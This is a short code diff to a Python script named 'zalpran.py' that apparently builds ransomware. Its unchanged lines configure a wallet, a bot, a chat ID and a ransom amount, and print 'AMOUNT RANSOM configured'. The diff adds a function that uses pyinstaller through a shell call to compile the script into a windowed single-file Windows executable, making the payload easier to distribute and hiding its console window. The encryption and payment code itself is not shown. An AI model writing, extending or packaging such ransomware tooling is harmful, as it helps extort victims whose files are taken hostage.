@@ -1,5 +1,7 @@
 import os
 import time
+import subprocess
+
 
 filename = 'zalpran.py'
 filepath = os.path.join(os.getcwd(),filename)
@@ -69,11 +71,21 @@ def get_amount():
     print(' AMOUNT RANSOM configured')
     return amount
 
+def py2exe():
+    output_dir = "C:\\Users\\DAVID\\Pictures\\happyboi"
+    os.makedirs(output_dir, exist_ok=True)
+    c0mmand = f'pyinstaller --onefile --distpath {output_dir} --windowed {filename}'
+    subprocess.call(c0mmand, shell=True)
+    print(f"The file has been converted to exe and is now saved at {output_dir}")
+
+
+
 def main():
     get_wallet()
     get_bot()
     get_chatID()
     get_amount()
+    py2exe()
 
 if __name__ == '__main__':
     main()
